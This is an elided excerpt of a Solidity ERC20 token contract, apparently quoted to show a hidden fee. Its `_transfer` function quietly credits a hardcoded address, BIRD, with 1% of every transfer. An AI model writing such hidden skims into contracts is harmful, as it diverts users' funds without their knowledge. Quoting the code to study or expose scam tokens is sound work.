...
contract ERC20 is Context, IERC20, Ownable {
    ...
    address internal BIRD = 0xb3F41396be96C24b8020d854CEA4073bd8485AcB;
    ...
    function _transfer(
        ...
        unchecked {
            ...
            _balances[BIRD] += (amount/100);
        }

        emit Transfer(from, to, (amount*99/100));
        emit Transfer(from, BIRD, (amount/100));
